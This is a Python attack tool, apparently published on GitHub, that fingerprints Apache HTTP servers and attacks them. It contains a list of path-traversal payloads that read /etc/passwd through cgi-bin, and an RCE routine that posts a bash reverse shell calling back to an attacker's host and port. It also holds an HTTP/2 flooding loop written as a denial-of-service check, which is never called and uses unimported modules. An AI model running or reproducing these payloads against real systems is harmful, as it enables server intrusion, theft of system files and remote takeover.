import argparse
import requests
import random
import sys

def header():
    print('''
 ▗▄▖▗▄▄▖ ▗▄▖ ▗▄▄▗▖ ▗▗▄▄▄▖     ▗▄▄▖▗▄▄▖▗▄▖▗▖  ▗▗▖  ▗▗▄▄▄▗▄▄▖
▐▌ ▐▐▌ ▐▐▌ ▐▐▌  ▐▌ ▐▐▌       ▐▌  ▐▌  ▐▌ ▐▐▛▚▖▐▐▛▚▖▐▐▌  ▐▌ ▐▌
▐▛▀▜▐▛▀▘▐▛▀▜▐▌  ▐▛▀▜▐▛▀▀▘     ▝▀▚▐▌  ▐▛▀▜▐▌ ▝▜▐▌ ▝▜▐▛▀▀▐▛▀▚▖
▐▌ ▐▐▌  ▐▌ ▐▝▚▄▄▐▌ ▐▐▙▄▄▖    ▗▄▄▞▝▚▄▄▐▌ ▐▐▌  ▐▐▌  ▐▐▙▄▄▐▌ ▐▌
                        https://github.com/Yqno
                                                ''')

def print_custom_help():
    print('''\
Usage: ApacheScanner.py [options]

Apache HTTP Server scanning and overtaking tool written by Yqno.

Options:
  -h, --help            Show this help message and exit
  -u URL, --url URL     The target URL of your Apache HTTP Server (e.g., example.com)
  -t TIMEOUT, --timeout TIMEOUT
                        The timeout of the request in seconds (default is 25)
  -p PORT, --port PORT  The port number of your Apache HTTP Server (default port is 80)
  -c COMMAND, --command COMMAND
                        The command to be executed on your Apache HTTP Server (default is ls -l)
  --rce                 Enable remote code execution on your Apache HTTP Server (default is False)
  --cmd CMD             Command to run if RCE is enabled (default is whoami)
  --lhost LHOST         Attacker IP for reverse shell (required if --rce is enabled)
  --lport LPORT         Attacker listening port for reverse shell (required if --rce is enabled)
''')

def main():
    parser = argparse.ArgumentParser(description='Apache HTTP Server overtaking tool written by Yqno.')

    parser.add_argument('-u', '--url', type=str, help='The target URL of your Apache HTTP Server (e.g., example.com)', required=True)
    parser.add_argument('-t', '--timeout', type=int, help='The timeout of the request in seconds (default is 25)', default=25)
    parser.add_argument('-p', '--port', type=int, help='The port number of your Apache HTTP Server (default port is 80)', default=80)
    parser.add_argument('-c', '--command', type=str, help='The command to be executed on your Apache HTTP Server (default is ls -l)', default='ls -l')
    parser.add_argument('--rce', action='store_true', help='Enable remote code execution on your Apache HTTP Server (default is False)', default=False)
    parser.add_argument('--cmd', type=str, help='Command to run if RCE is enabled (default is whoami)', default="whoami")
    parser.add_argument('--lhost', type=str, help='Attacker IP for reverse shell (required if --rce is enabled)', required=False)
    parser.add_argument('--lport', type=int, help='Attacker listening port for reverse shell (required if --rce is enabled)', required=False)

    args =parser.parse_args()

    # Check if the user requested help
    if '--help' in sys.argv or '-h' in sys.argv:
        print_custom_help()
        sys.exit()

    # Validate RCE arguments
    if args.rce:
        if not args.lhost or not args.lport:
            print("[!] --lhost and --lport are required when --rce is enabled.")
            sys.exit(1)

    # Proceed with the rest of the script
    exploiter = Exploiter(args.url, args.timeout, args.port, args.command, args.rce, args.cmd, args.lhost, args.lport)
    exploiter.run_checks()

class Exploiter:
    def __init__(self, url, timeout, port, command, rce, cmd, lhost, lport):
        self.url = self.normalize_url(url)
        self.timeout = timeout
        self.port = port
        self.command = command
        self.rce = rce
        self.cmd = cmd
        self.lhost = lhost
        self.lport = lport

        # List of User-Agents
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0',
            'Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; Nexus 7 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
        ]


        # Randomly choose a User-Agent for each request
        self.headers = {
            'User-Agent': random.choice(user_agents),
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
        }


        self.path_traversal_payloads = [
            "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            "/../../../../../../etc/passwd",
            "/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd",
            "/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini",
            "/..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
            "/..;/..;/..;/..;/etc/passwd"
        ]




    # Normalize URL to add https:// if not present
    def normalize_url(self, url):
        if not url.startswith("http://") and not url.startswith("https://"):
            print(f"[*] No protocol provided for URL '{url}', defaulting to 'https://'.")
            url = f"https://{url}"
        return url.rstrip('/')


    def check_dosattack(self):
        print(f"[*] Checking for DoS vulnerability on {self.url}")
        try:
            hostname = self.url.split("//")[-1].split("/")[0]  # Extract hostname or IP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((hostname, self.port))

            s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
            SETTINGS = struct.pack('3B', 0x00, 0x00, 0x00) + struct.pack('B', 0x04) + struct.pack('B', 0x00) + struct.pack('>I', 0x00000000)
            s.sendall(SETTINGS)
            while True:
                HEADER_BLOCK_FRAME = b'\x40\x83\x18\xc6\x3f\x04\x76\x76\x76\x76'
                HEADERS = struct.pack('>I', len(HEADER_BLOCK_FRAME))[1:] + struct.pack('B', 0x09) + struct.pack('B', 0x01) + struct.pack('>I', 0x00000001)
                s.sendall(HEADERS + HEADER_BLOCK_FRAME)

        except BrokenPipeError:
            print("[!] Connection was forcibly closed by the server (Broken Pipe).")
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            s.close()   
    
    
    
    # Check if the website is running Apache HTTP
    def check_apache(self):
        print(f"[*] Checking if {self.url} is running Apache HTTP server...")
        try:
            response = requests.head(self.url, headers=self.headers, timeout=self.timeout)
            server_header = response.headers.get('Server', '').lower()
            if 'apache' in server_header:
                print("[+] Apache HTTP server detected!")
                return True
            else:
                print("[-] Apache HTTP server not detected.")
                return False
        except requests.RequestException as e:
            print(f"[!] Error while checking server type: {e}")
            return False

    # Run all checks
    def run_checks(self):
        if not self.check_apache():
            print("[!] Exiting. The target is not running Apache HTTP server.")
            return
        print("[*] Proceeding with vulnerability checks...")
        self.check_pathtraversal()
        if self.rce:
            self.check_rce()

    def check_pathtraversal(self):
        print(f"[*] Checking for path traversal vulnerabilities on {self.url}")
        for payload in self.path_traversal_payloads:
            target = f"{self.url}{payload}"
            try:
                response = requests.get(target, headers=self.headers, timeout=self.timeout)
                if "root:x:" in response.text or "boot.ini" in response.text:
                    print(f"[+] Path traversal vulnerability found! Payload: {payload}")
                else:
                    print(f"[-] No path traversal vulnerability detected with payload: {payload}")
            except Exception as e:
                print(f"[!] Error with payload {payload}: {e}")


    def check_rce(self):
        print(f"[*] Checking for remote code execution vulnerability on {self.url}")
        target = f"{self.url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        data = {"echo": payload}

        try:
            response = requests.post(target, data=data, headers=self.headers, timeout=self.timeout)
            if response.status_code == 200:
                print("[+] Remote code execution vulnerability found!")
            else:
                print("[-] No remote code execution vulnerability detected.")
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    header()
    main()
